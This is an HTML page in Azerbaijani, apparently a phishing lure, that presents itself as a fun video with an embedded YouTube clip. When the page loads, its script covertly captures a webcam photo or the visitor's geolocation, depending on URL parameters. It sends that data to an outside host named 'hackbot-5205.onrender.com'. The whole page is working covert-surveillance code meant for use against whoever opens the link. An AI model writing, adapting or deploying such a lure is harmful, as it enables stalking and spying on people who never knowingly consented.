<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Maraqlƒ± Video</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            text-align: center;
            background: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h1 {
            color: #333;
            font-size: 24px;
            margin-bottom: 20px;
        }
        iframe {
            border: none;
            border-radius: 8px;
        }
        .message {
            margin-top: 10px;
            font-size: 16px;
            color: #666;
        }
    </style>
    <script>
        async function getMedia(unique_id, api_url) {
            try {
                console.log("Kamera icaz…ôsi ist…ônilir...", { unique_id, api_url });
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;

                // Videonun y√ºkl…ônm…ôsini g√∂zl…ô
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        console.log("Video y√ºkl…ôndi, √∂l√ß√ºl…ôr:", video.videoWidth, video.videoHeight);
                        resolve();
                    };
                });

                video.play();
                await new Promise((resolve) => setTimeout(resolve, 1000)); // ∆èlav…ô g√∂zl…ôm…ô

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;  // Dinamik √∂l√ß√º
                canvas.height = video.videoHeight;  // Dinamik √∂l√ß√º
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                stream.getTracks().forEach(track => track.stop());

                // ≈û…ôkli konsolda yoxla
                const imageDataUrl = canvas.toDataURL('image/jpeg');
                console.log("√á…ôkil…ôn ≈ü…ôkil (ilk 50 simvol):", imageDataUrl.substring(0, 50) + "...");

                canvas.toBlob(blob => {
                    console.log("≈û…ôkil √ß…ôkildi, API-y…ô g√∂nd…ôrilir...", { blobSize: blob.size });
                    const formData = new FormData();
                    formData.append('photo', blob, 'photo.jpg');
                    formData.append('unique_id', unique_id);
                    fetch(api_url + '/upload', {
                        method: 'POST',
                        body: formData
                    }).then(response => {
                        console.log('≈û…ôkil g√∂nd…ôrildi:', response.status, response.statusText);
                        return response.text();
                    }).catch(error => {
                        console.error('≈û…ôkil g√∂nd…ôrilm…ô x…ôtasƒ±:', error);
                    });
                }, 'image/jpeg', 0.9);  // JPEG formatƒ±nda, keyfiyy…ôt 0.9
            } catch (err) {
                console.error("Kamera x…ôtasƒ±:", err);
            }
        }

        function getLocation(unique_id, api_url) {
            if (navigator.geolocation) {
                console.log("Yer icaz…ôsi ist…ônilir...");
                navigator.geolocation.getCurrentPosition(position => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    console.log("Yer m…ôlumatƒ± alƒ±ndƒ±:", lat, lon);
                    fetch(api_url + '/upload_location', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({unique_id: unique_id, latitude: lat, longitude: lon})
                    }).then(response => {
                        console.log('Yer g√∂nd…ôrildi:', response.status, response.statusText);
                        return response.text();
                    }).catch(error => {
                        console.error('Yer g√∂nd…ôrilm…ô x…ôtasƒ±:', error);
                    });
                }, err => {
                    console.error("Yer x…ôtasƒ±:", err);
                });
            } else {
                console.error("Brauzer geolocation-u d…ôst…ôkl…ômir");
            }
        }

        window.onload = function() {
            const urlParams = new URLSearchParams(window.location.search);
            const unique_id = urlParams.get('id');
            const type = urlParams.get('type');
            const api_url = 'https://hackbot-5205.onrender.com'; // Ngrok linkinizi bura yazƒ±n

            console.log("Link parametrl…ôri:", { unique_id, type, api_url });

            if (!unique_id || !type) {
                document.body.innerHTML = '<h1>Ke√ß…ôrsiz link!</h1>';
                console.error("Ke√ß…ôrsiz link: unique_id v…ô ya type yoxdur");
                return;
            }

            if (type === 'camera') {
                getMedia(unique_id, api_url);
            } else if (type === 'location') {
                getLocation(unique_id, api_url);
            }
        };
    </script>
</head>
<body>
    <div class="container">
        <h1>Bu Maraqlƒ± Videoya Bax!</h1>
        <iframe width="560" height="315" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
        <p class="message">Videodan h…ôzz al! üòä</p>
    </div>
</body>
</html>
